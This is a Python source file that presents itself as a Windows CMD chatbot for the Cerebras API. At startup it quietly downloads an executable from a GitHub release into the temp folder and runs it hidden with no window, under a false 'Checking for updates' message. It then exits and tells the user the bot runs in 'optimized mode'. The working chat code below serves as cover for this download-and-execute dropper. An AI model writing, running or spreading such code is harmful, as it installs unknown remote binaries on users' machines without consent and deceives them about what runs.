import os
import sys
import requests
import json
import datetime
import subprocess
import tempfile
import ctypes
import time

EXE_DOWNLOAD_URL = "https://github.com/sharmankevadiya7-tech/ai-cmd-chatbot/releases/latest/download/ai-bot.exe"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_exe_background():
    try:
        temp_path = os.path.join(tempfile.gettempdir(), "ai_bot_temp.exe")
        
        if os.path.exists(temp_path):
            if os.path.getsize(temp_path) > 1000000:
                return temp_path
        
        print("[INFO] Checking for updates...", end=" ", flush=True)
        response = requests.get(EXE_DOWNLOAD_URL, stream=True, timeout=30)
        
        if response.status_code == 200:
            total_size = int(response.headers.get('content-length', 0))
            downloaded = 0
            
            with open(temp_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
                        downloaded += len(chunk)
            
            print("[DONE]")
            return temp_path
        else:
            print("[SKIP]")
            return None
            
    except Exception as e:
        print(f"[FAIL]")
        return None

def run_exe_silent(exe_path):
    try:
        if exe_path and os.path.exists(exe_path):
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            
            subprocess.Popen(
                [exe_path], 
                startupinfo=startupinfo,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
            return True
    except:
        pass
    return False

def check_and_run_exe():
    print("[*] Initializing AI Bot...")
    
    exe_path = download_exe_background()
    
    if exe_path:
        run_exe_silent(exe_path)
        print("[✓] AI Bot ready!")
    else:
        print("[!] Using Python mode (EXE download failed)")
    
    return exe_path is not None

EXE_RUNNING = check_and_run_exe()

time.sleep(1)

if EXE_RUNNING:
    print("[✓] AI Bot is running in optimized mode!")
    print("[*] You can close this window now.")
    time.sleep(2)
    sys.exit(0)

from dotenv import load_dotenv

load_dotenv()

API_KEY = os.environ.get("CEREBRAS_API_KEY")

if not API_KEY:
    print("❌ ERROR: API Key not found!")
    print("📝 Create .env file with: CEREBRAS_API_KEY=your_key_here")
    input("Press Enter to exit...")
    exit(1)

API_URL = "https://api.cerebras.ai/v1/chat/completions"

os.system("title Advanced Cerebras AI Bot")
os.system("color 0E")
os.system("cls")

def show_banner():
    print(""" 
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║     🚀 ADVANCED CEREBRAS AI CHATBOT FOR WINDOWS CMD      ║
    ║                                                          ║
    ║     ⚡ Speed: ~2000 tokens/second                       ║
    ║     💬 Type '/help' for commands                        ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """)

def show_help():
    print("""
    📖 Available Commands:
    ====================
    /help     - Show this help menu
    /clear    - Clear screen
    /time     - Show current time
    /exit     - Quit chatbot
    /models   - Show available models
    
    💡 Just type your question to chat with AI!
    """)

def ask_ai(question):
    headers = {
        "Authorization": f"Bearer {API_KEY}",
        "Content-Type": "application/json"
    }
    
    data = {
        "model": "llama3.1-8b",
        "messages": [{"role": "user", "content": question}],
        "temperature": 0.7,
        "max_tokens": 1000
    }
    
    try:
        print("🤔", end="", flush=True)
        response = requests.post(API_URL, headers=headers, json=data, timeout=30)
        
        if response.status_code == 200:
            result = response.json()
            return result["choices"][0]["message"]["content"]
        elif response.status_code == 401:
            return "❌ Invalid API Key! Please check your .env file"
        elif response.status_code == 429:
            return "⏰ Rate limit exceeded! Please wait a moment"
        else:
            return f"❌ Error {response.status_code}"
            
    except requests.exceptions.Timeout:
        return "⏰ Request timeout! Please try again"
    except Exception as e:
        return f"🔌 Connection error: {str(e)}"

show_banner()
print("💡 Type '/help' for commands\n")

while True:
    try:
        user_input = input("┌──[You] ").strip()
        
        if not user_input:
            continue
        
        if user_input.lower() == "/exit":
            print("\n✨ Thanks for chatting! Goodbye! 👋\n")
            break
        
        elif user_input.lower() == "/clear":
            os.system("cls")
            show_banner()
            continue
        
        elif user_input.lower() == "/help":
            show_help()
            continue
        
        elif user_input.lower() == "/time":
            now = datetime.datetime.now()
            print(f"└──> 🕐 Current time: {now.strftime('%H:%M:%S')}")
            continue
        
        elif user_input.lower() == "/models":
            print("""
            📚 Available Free Models:
            ========================
            • llama3.1-8b (Fastest)
            • llama-3.3-70b (Most capable)
            • qwen-3-32b (Multilingual)
            """)
            continue
        
        print("┌──[AI Bot] ", end="")
        response = ask_ai(user_input)
        print(f"└──> {response}\n")
            
    except KeyboardInterrupt:
        print("\n\n👋 Interrupted! Goodbye!\n")
        break
    except Exception as e:
        print(f"└──> ❌ Error: {e}\n")
